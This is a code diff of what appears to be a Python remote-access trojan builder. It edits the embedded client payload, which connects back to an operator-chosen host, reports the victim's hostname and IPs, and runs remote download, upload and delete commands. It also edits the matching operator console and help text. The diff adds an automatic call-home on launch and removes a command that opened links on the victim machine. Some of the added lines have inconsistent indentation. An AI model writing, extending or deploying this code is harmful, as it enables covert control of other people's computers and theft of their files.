@@ -49,7 +49,7 @@ import time
 from random import random
 import shutil
 import requests
-
+s = ''
 def mainthing():
 
 	while True:
@@ -106,13 +106,6 @@ def mainthing():
 	        time.sleep(1)
 	        s.send(ps.encode('utf-8'))
 
-	      
-	        
-
-	    elif command[:4] == 'link':
-	        linktoopen = command[5:]
-	        os.system(f'start iexplore.exe "{linktoopen}"')
-
 	    elif command[:8] == 'download':
 	        filename = command[9:]
 	        if os.path.isdir(filename) or os.path.isfile(filename):
@@ -140,7 +133,7 @@ def mainthing():
 	            msg1 = 'File Successfully delete!'
 	            s.send(msg1.encode('utf-8'))
 	        else:
-	            msg = f"No File Name {filetodel} [!]"
+	            msg = "FIle Not Found! [unable to delete]"
 	            s.send(msg.encode('utf-8'))
 
 	    elif command[:5] == 'rm -f':
@@ -179,14 +172,19 @@ def mainthing():
 	        hostip = socket.gethostbyname(host_name)
 	        p_ip = requests.get('https://api.ipify.org').text
 
-	        s.send(bytes(f"Host Name: {host_name}", "utf-8"))
+		msg1 = "Host Name:" + " " + host_name
+		msg2 = "Ip:" + " " + hostip
+		msg3 = "Public Ip:" + " " + p_ip
+
+	        s.send(bytes(msg1, 'utf-8'))
 	        time.sleep(1)
-	        s.send(bytes(f"Ip: {hostip}", "utf-8"))
+	        s.send(bytes(msg2, 'utf-8'))
 	        time.sleep(1)
-	        s.send(bytes(f"Public Ip: {p_ip}", "utf-8"))
+	        s.send(bytes(msg3, 'utf-8'))
 
 def connection():
 	try:
+		global s
 		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # creating socket
 		host = hostvar
 		port = portvar
@@ -196,6 +194,7 @@ def connection():
 	except socket.error:
 		time.sleep(3)
 		connection()
+connection()
 
 """)
 
@@ -242,7 +241,6 @@ show dir	     :	Show dir and files in current dir.
 show custom dir <dir>:	Show dir and files from custom dir.
 clear		     :	Clear your terminal.
 system platform      : 	Show system platform of client device.
-link <url>           :	Open a link in client device.
 download <file/dir>  :	To download files or dir Note: only for now dir.
 send <file>	     :	Send file or dir to target device.
 send -p <path>	     :	Send file or dir to target device from other dir. Example: send -p location_of_file/hack.py
@@ -340,11 +338,6 @@ close                :  Close the connection.
 
         	time.sleep(1)
         	print(msg.decode('utf-8'))
-
-
-        elif user[:4] == 'link':
-            server.send(user.encode())
-            time.sleep(1)
 
         elif user[:8] == 'download':
             server.send(user.encode())
